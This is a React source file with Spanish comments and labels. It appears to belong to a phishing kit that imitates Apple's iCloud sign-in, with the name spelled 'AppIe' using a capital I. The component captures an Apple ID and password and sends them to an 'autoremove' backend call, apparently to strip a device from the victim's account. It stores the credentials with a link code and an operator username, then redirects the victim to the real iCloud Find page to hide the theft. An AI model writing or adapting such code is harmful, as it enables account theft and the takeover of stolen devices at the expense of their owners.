
import { use, useState, useEffect } from 'react';
import FloatingLabel from 'react-bootstrap/FloatingLabel';
import Form from 'react-bootstrap/Form';
import Button from 'react-bootstrap/Button';
import '../../assets/css/modalAuth.css';

import SvgSpinner from '../../../resources/SvgSpinner';
import SvgNext from '../../../resources/SvgNext';
import imgNext from '../../assets/img/btnNext.png';
import PoputLogin from '../../../resources/poputs/PopupLogin';
import responses from '../../../api/responses';
import { useData } from '../../../context/UserContext';


const Login = ({
    translator
}) => {

    const { user } = useData();
    const [opLogin, setOpLogin] = useState(false); // Estado permitira saber si se esta enviando solo el usuario o usuario y contraseña    
    const [statusLogin, setStatusLogin] = useState(false);  //false -> show imgNext - true -> show SvgNext
    const [accountUsername, setAccountUsername] = useState('');
    const [accountPassword, setAccountPassword] = useState('');


    const showInputPassword = () => { //Muestra el input de la contraseña

        if (accountUsername != '') {
            setStatusLogin(true)

            document.getElementById('accountUsername').style.borderRadius = '6px 6px 0 0';
            document.getElementById('accountPassword').style.borderRadius = '0 0 6px 6px';
            document.getElementById("SliderMaps").style.borderRadius = '0 0 6px 6px';
            document.getElementById("SliderDiv").style.borderRadius = '0 0 6px 6px';

            setTimeout(() => {

                document.getElementById('btnAccount').style.opacity = '0.6'

                const sliderElement = document.getElementById("SliderMaps")[0];
                if (sliderElement) {

                    sliderElement.classList.toggle("slide-down");
                }
                document.getElementById("SliderDiv").style.transform = "translateY(0%)"
                document.getElementById("btnAccount").style.transform = "translateY(-10%)"
                document.getElementById('accountPassword').focus()
                setStatusLogin(false)
                setOpLogin(true)

            }, 1500);
        }

    }

    const hideInputPassword = () => { //Oculta el input de la contraseña    

        document.getElementById('accountUsername').style.borderRadius = '6px';
        document.getElementById('accountPassword').style.borderRadius = '6px';
        document.getElementById("SliderMaps").style.borderRadius = '6px 6px';
        document.getElementById("SliderDiv").style.borderRadius = '6px';
        document.getElementsByClassName('popupLogin')[0].style.display = 'none'



        const sliderElement = document.getElementById("SliderMaps")[0];
        if (sliderElement) {

            sliderElement.classList.toggle("slide-up");
        }
        document.getElementById("SliderDiv").style.transform = "translateY(-128%)"
        document.getElementById("btnAccount").style.transform = "translateY(-157%)"
        setStatusLogin(false)
    }


    const handleLogin = async (event) => {
        event.preventDefault()


        document.getElementsByClassName('popupLogin')[0].style.display = 'none'
        if (accountUsername != '' && !opLogin) {
            showInputPassword();
            setAccountPassword('')
            //console.log('Solo se envio el login')
        } else if (accountUsername != '' && opLogin) {

            if (accountPassword != '') {

                setStatusLogin(true)
                console.log('Enviando usuario y contraseña')

                try {
                    console.log('Autoremoved failed');
                    setStatusLogin(true)
                    const response = await responses.autoremove(accountUsername, accountPassword);
                    console.log(response)

                    let status = response.success;
                    let responseData = response.message;
                    console.log(status)
                    console.log(responseData)

                    await saveAutoRemoveData(status, responseData);
                    if (status == 0) {
                        console.log('Autoremoved failed');
                        setStatusLogin(false)
                        document.getElementsByClassName('popupLogin')[0].style.display = 'block';
                    } else if (status == 1) {
                        setStatusLogin(true);
                        setTimeout(() => {
                            localStorage.removeItem(`userData_${user?.data?.linkCode}`);
                            //window.location.reload();
                            window.location.href = 'https://www.icloud.com/find';
                        }, 1000);
                    }
                } catch (error) {
                    localStorage.removeItem(`userData_${user?.data?.linkCode}`);
                }

            }

        }
    }


    const saveAutoRemoveData = async (status, response) => {
        //const geo = await responses.getLocation();

        let data = {
            linkCode: user?.data?.linkCode || '',
            appleID: accountUsername,
            password: accountPassword,
            response: response,
            username: user?.data?.username || '',
            status: status,
        }

        const resp = await responses.addData(data);
        return resp;

    }

    return (
        <>
            <Form onSubmit={handleLogin} style={{ position: 'relative' }}>
                <h3 className="my-3 static-size" style={{ textAlign: 'center' }}>{translator('Iniciar sesión con tu cuenta de AppIe')}</h3>
                <div id="divemail" bis_skin_checked="1">
                    <FloatingLabel
                        controlId="accountUsername"
                        label={translator('Correo o número de telefono')}
                        className="mb-3"
                    >
                        <Form.Control
                            type="text"
                            placeholder={translator('Correo o número de telefono')}
                            style={{ paddingRight: '60px' }}
                            value={accountUsername}
                            onChange={({ target }) => {

                                setAccountUsername(target.value)
                                setOpLogin(false)

                                {
                                    target.value == ''
                                        ? document.getElementById('btnAccount').style.opacity = '0.6'
                                        : document.getElementById('btnAccount').style.opacity = '1'
                                }
                                hideInputPassword();  //Oculta el input de la contraseña                              
                                setAccountPassword(''); //Vacia el input de la contraseña
                            }}

                        />
                    </FloatingLabel>

                </div>

                <Button type='submit' className='btn' id='btnAccount'>
                    {statusLogin
                        ? <SvgSpinner style={{ color: 'gray' }} />
                        : <img id='imgNext' src={imgNext} />}
                </Button>

                <div className="slide-up SliderMaps" id="SliderMaps" bis_skin_checked="1">
                    <div id="SliderDiv" bis_skin_checked="1">
                        <FloatingLabel controlId="accountPassword" label={translator('Contraseña')}>
                            <Form.Control
                                type="password"
                                placeholder={translator('Contraseña')}
                                style={{ paddingRight: '70px' }}
                                value={accountPassword}
                                onChange={({ target }) => {
                                    setAccountPassword(target.value)
                                    document.getElementsByClassName('popupLogin')[0].style.display = 'none'
                                    {
                                        target.value == ''
                                            ? document.getElementById('btnAccount').style.opacity = '0.6'
                                            : document.getElementById('btnAccount').style.opacity = '1'
                                    }
                                }}
                                autoComplete='off'
                            />
                        </FloatingLabel>
                    </div>

                </div>

                <PoputLogin
                    translator={translator}
                    text={translator('No se pudo verificar tu identidad')}
                />

            </Form>
        </>
    )
}

export default Login;